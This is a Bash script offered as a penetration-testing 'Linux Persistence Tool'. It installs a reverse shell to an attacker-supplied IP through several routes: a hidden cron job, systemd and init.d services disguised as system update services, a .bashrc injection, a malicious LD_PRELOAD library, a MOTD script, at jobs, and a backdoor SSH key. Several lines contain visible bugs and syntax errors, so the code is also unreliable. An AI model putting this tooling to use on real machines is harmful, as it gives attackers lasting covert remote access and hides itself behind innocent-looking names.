#!/bin/bash

# Linux Persistence Script
# Author: Penetration Testing Tool
# Description: Multiple persistence techniques for Linux systems

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RESET='\033[0m' # No Color


print_banner() {
    echo -e "${BLUE}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                    Linux Persistence Tool                    ║"
    echo "║                                                              ║"
    echo "║  WARNING: For authorized penetration testing only!           ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
}

log() {
    local level=$1
    local message=$2

    case $level in
        "SUCCESS")
            echo -e "[${GREEN}✓${RESET}] $message""
            ;;
        "INFO")
            echo -e "[${BLUE}i${RESET}] $message""
            ;;
        "WARN")
            echo -e "[${YELLOW}!${RESET}] $message""
            ;;
        "ERROR")
            echo -e "[${RED}✗${RESET}] $message""
            ;;
    esac
}

check_root() {
    if [[ $EUID -eq 0 ]]; then
        log "SUCCESS" "Running as root - all techniques available"
        return 0
    else
        log_warning "Not running as root - limited techniques available"
        return 1
    fi
}

# 1. Crontab Persistence
setup_cron_persistence() {
    if [[ -z "$1" ]]; then
        
    fi
    log "SUCCESS" "Setting up cron persistence..."
    
    # Create hidden script
    cat > /tmp/.hidden_script.sh << EOF
#!/bin/bash
# Hidden persistence script
if ! pgrep -f "persistence_daemon" > /dev/null; then
    nohup bash -c '${PAYLOAD_COMMAND}' > /dev/null 2>&1 &
fi
EOF
    
    chmod +x /tmp/.hidden_script.sh
    
    # Add to crontab
    (crontab -l 2>/dev/null; echo "$CRON_COMMAND") | crontab -
    log "SUCCESS" "Cron persistence established"
}

# 2. Systemd Service Persistence (requires root falls to user)
setup_systemd_persistence() {
    if check_root; then
        log "SUCCESS" "Setting up (Root) systemd service persistence..."
        
        # Create service file
        cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c '$REVERSE_SHELL'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
        
        # Enable and start service
        systemctl daemon-reload
        systemctl enable ${SERVICE_NAME}.service
        systemctl start ${SERVICE_NAME}.service
        
        log "SUCCESS" "Systemd service persistence established"

    else
        log "SUCCESS" "Setting up systemd user service..."
        mkdir -p ~/.config/systemd/user

        cat > ~/.config/systemd/user/update-checker.service << EOF
[Unit]
Description=System Update Checker
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c '$REVERSE_SHELL'
Restart=always
RestartSec=300

[Install]
WantedBy=default.target
EOF

        systemctl --user daemon-reload
        systemctl --user enable update-checker.service
        systemctl --user start update-checker.service
    fi
}

# 3. SSH Key Persistence
setup_ssh_persistence() {
    log "SUCCESS" "Setting up SSH key persistence..."
    
    # Generate SSH key if not exists
    if [[ ! -f ~/.ssh/persistence_rsa ]]; then
        ssh-keygen -t rsa -b 4096 -f ~/.ssh/persistence_rsa -N ""
    fi

    # Add to authorized_keys
    mkdir -p ~/.ssh
    chmod 700 ~/.ssh

    cat ~/.ssh/persistence_rsa.pub >> ~/.ssh/authorized_keys

    log "INFO" "Your private key:"
    cat ~/.ssh/persistence_rsa
    rm ~/.ssh/persistence_rsa

    chmod 600 ~/.ssh/authorized_keys

    log "SUCCESS" "SSH key persistence established"
}

# 4. Bashrc Persistence
setup_bashrc_persistence() {
    log "SUCCESS" "Setting up bashrc persistence..."
    
    # Add to .bashrc
    echo "" >> ~/.bashrc
    echo "# System update check" >> ~/.bashrc
    echo "if [[ \$- == *i* ]]; then" >> ~/.bashrc
    echo "    nohup bash -c '$REVERSE_SHELL' > /dev/null 2>&1 &" >> ~/.bashrc
    echo "fi" >> ~/.bashrc
    
    log "SUCCESS" "Bashrc persistence established"
}

# 5. Init.d Script Persistence (requires root)
setup_initd_persistence() {
    if ! check_root; then
        log "ERROR" "Root required for init.d persistence"
        return 1
    fi
    
    log "SUCCESS" "Setting up init.d persistence..."
    
    cat > /etc/init.d/${SERVICE_NAME} << EOF
#!/bin/bash
### BEGIN INIT INFO
# Provides:          system-update
# Required-Start:    \$remote_fs \$syslog
# Required-Stop:     \$remote_fs \$syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Update Service
### END INIT INFO

case "$1" in
    start)
        nohup bash -c '${PAYLOAD_COMMAND}' > /dev/null 2>&1 &
        ;;
    stop)
        pkill -f "persistence_daemon"
        ;;
    *)
        echo "Usage: $0 {start|stop}"
        exit 1
        ;;
esac
EOF
    
    chmod +x /etc/init.d/${SERVICE_NAME}
    update-rc.d ${SERVICE_NAME} defaults
    
    log "SUCCESS" "Init.d persistence established"
}

# 6. Library Hijacking Persistence
setup_library_hijacking() {
    log "SUCCESS" "Setting up library hijacking persistence..."
    
    # Create malicious library
    cat > /tmp/.libpersist.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    if (fork() == 0) {
        system("${PAYLOAD_COMMAND}");
    }
}
EOF
    
    gcc -shared -fPIC /tmp/.libpersist.c -o /tmp/.libpersist.so
    
    # Add to LD_PRELOAD
    echo "export LD_PRELOAD=/tmp/.libpersist.so:\$LD_PRELOAD" >> ~/.bashrc
    
    log "SUCCESS" "Library hijacking persistence established"
}

# 7. Motd Persistence (requires root)
setup_motd_persistence() {
    if ! check_root; then
        log "ERROR" "Root required for MOTD persistence"
        return 1
    fi
    
    log "SUCCESS" "Setting up MOTD persistence..."
    
    cat > /etc/update-motd.d/99-custom << EOF
#!/bin/bash
nohup bash -c '${PAYLOAD_COMMAND}' > /dev/null 2>&1 &
EOF
    
    chmod +x /etc/update-motd.d/99-custom
    
    log "SUCCESS" "MOTD persistence established"
}

# 8. At Job Persistence
setup_at_persistence() {
    if command -v "at" &>/dev/null; then
        log "SUCCESS" "Setting up at job persistence..."

        # Schedule job for 1 minute from now, recurring
        echo "bash -c '$REVERSE_SHELL'" | at now + 1 minute

        log "SUCCESS" "At job persistence established"
    else
        log "ERROR" "Command at not found"
    fi
}

# Cleanup function
cleanup_persistence() {
    log "WARN" "Cleaning up persistence mechanisms..."
    
    # Remove cron jobs
    crontab -l | grep -v ".hidden_script.sh" | crontab -
    rm -f /tmp/.hidden_script.sh
    
    # Remove systemd service
    if check_root; then
        systemctl stop ${SERVICE_NAME}.service 2>/dev/null
        systemctl disable ${SERVICE_NAME}.service 2>/dev/null
        rm -f /etc/systemd/system/${SERVICE_NAME}.service
        systemctl daemon-reload
    fi
    
    # Clean bashrc
    sed -i '/System update check/,+4d' ~/.bashrc
    
    # Remove init.d script
    if check_root; then
        update-rc.d ${SERVICE_NAME} remove 2>/dev/null
        rm -f /etc/init.d/${SERVICE_NAME}
    fi
    
    # Remove library
    rm -f /tmp/.libpersist.so /tmp/.libpersist.c
    sed -i '/LD_PRELOAD.*libpersist/d' ~/.bashrc
    
    # Remove MOTD
    if check_root; then
        rm -f /etc/update-motd.d/99-custom
    fi
    
    log "SUCCESS" "Cleanup completed"
}

# Main menu
show_menu() {
    echo -e "${BLUE}Select persistence technique:${RESET}"
    echo "1) Crontab persistence"
    echo "2) Systemd service persistence (root required)"
    echo "3) SSH key persistence"
    echo "4) Bashrc persistence"
    echo "5) Init.d script persistence (root required)"
    echo "6) Library hijacking persistence"
    echo "7) MOTD persistence (root required)"
    echo "8) At job persistence"
    echo "9) Install all available techniques"
    echo "10) Cleanup all persistence"
    echo "0) Exit"
    echo -n "Choice: "
}

# Function to validate IPv4 address
is_valid_ip() {
    local ip=$1

    # Simple regex for IPv4
    local regex='^([0-9]{1,3}\.){3}[0-9]{1,3}$'

    if [[ $ip =~ $regex ]]; then
        # Split IP into its parts and check each is <= 255
        IFS='.' read -r -a octets <<< "$ip"
        for octet in "${octets[@]}"; do
            if ((octet < 0 || octet > 255)); then
                return 1
            fi
        done
        return 0
    else
        return 1
    fi
}


main() {
    # Check if argument is provided
    if [[ -z "$1" ]]; then
        echo "Usage: $0 <IP_ADDRESS>"
        exit 1
    fi

    # Validate IP
    if is_valid_ip "$1"; then
        echo "Valid IP address: $1"
        ATTACK_IP=$1
    else
        echo "Invalid IP address: $1"
        exit 1
    fi

    # Configuration
    #PAYLOAD_URL="http://${ATTACK_IP}/payload.sh"
    REVERSE_SHELL="bash -i >& /dev/tcp/${ATTACK_IP}/${PORT} 0>&1"
    CRON_COMMAND="* * * * * /tmp/.hidden_script.sh"
    SERVICE_NAME="system-update"

    # arg or revert to default
    PORT="${$2-'4444'}"
    PAYLOAD_COMMAND="${$3-$REVERSE_SHELL}"

    print_banner
    
    while true; do
        show_menu
        read -r choice
        
        case $choice in
            1) setup_cron_persistence ;;
            2) setup_systemd_persistence ;;
            3) setup_ssh_persistence ;;
            4) setup_bashrc_persistence ;;
            5) setup_initd_persistence ;;
            6) setup_library_hijacking ;;
            7) setup_motd_persistence ;;
            8) setup_at_persistence ;;
            9) 
                log "SUCCESS" "Installing all available persistence techniques..."
                setup_cron_persistence
                setup_systemd_persistence
                setup_ssh_persistence
                setup_bashrc_persistence
                setup_initd_persistence
                setup_library_hijacking
                setup_motd_persistence
                setup_at_persistence
                ;;
            10) cleanup_persistence ;;
            0) 
                log "SUCCESS" "Exiting..."
                exit 0
                ;;
            *) log "ERROR" "Invalid choice" ;;
        esac
        
        echo ""
    done
}

# Check if script is being sourced or executed
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
